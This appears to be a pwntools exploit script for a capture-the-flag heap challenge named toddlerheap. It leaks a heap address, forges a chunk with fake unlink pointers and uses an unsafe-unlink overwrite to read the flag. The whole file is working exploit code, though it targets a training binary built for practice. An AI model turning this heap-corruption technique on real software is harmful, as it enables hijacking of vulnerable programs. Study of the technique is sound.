from pwn import *

malloc_size = 1056
guard_size = 1056
trigger_size = 1104

context.arch = 'amd64'
BINARY = "/challenge/toddlerheap_level5.1"
p = process(BINARY)

#heap_leak_to_flag_offset = 0x5e0
heap_leak_to_flag_offset = 0x550

p.sendline(f"malloc 0 {malloc_size}".encode())
p.sendline(f"malloc 1 {guard_size}".encode())
p.sendline(f"free 0".encode())
p.sendline(f"malloc 2 {trigger_size}".encode())
p.sendline(f"malloc 0 {malloc_size}".encode())
p.sendline(b"read 0 16")
p.send(b"A"*16)
print(p.clean().decode())
p.sendline(b"puts 0")
p.recvuntil(b"A"*16)
leak = p.recvuntil(b"\n")[:-1]
heap_leak = unpack(leak, 'all')
print(f'heap_leak = {hex(heap_leak)}')

flag_addr = heap_leak - heap_leak_to_flag_offset
chunk0_ptr = heap_leak + 0x10
chunk0_ptr_loc = 0x404140

dummy = p64(0)
dummy_to_next_chunk = b'\x00' * (malloc_size + 16 - 16 - 32)
payload = dummy + p64(malloc_size + 16 + 1 - 0x10) + p64(chunk0_ptr_loc - 24) + p64(chunk0_ptr_loc - 16) + dummy_to_next_chunk + p64(malloc_size) + p64(malloc_size+0x10)
p.sendline(f"read 0 {malloc_size + 16}".encode())
p.send(payload)
p.sendline(b'free 1')
payload = dummy + p64(malloc_size + 16 + 1 - 0x10) + p64(chunk0_ptr_loc - 24) + p64(flag_addr)
p.sendline(b"read 0 32")
p.send(payload)

p.sendline(b"puts 0")
# unsafe_unlink(malloc_size + 16, chunk0_ptr_loc)

p.clean()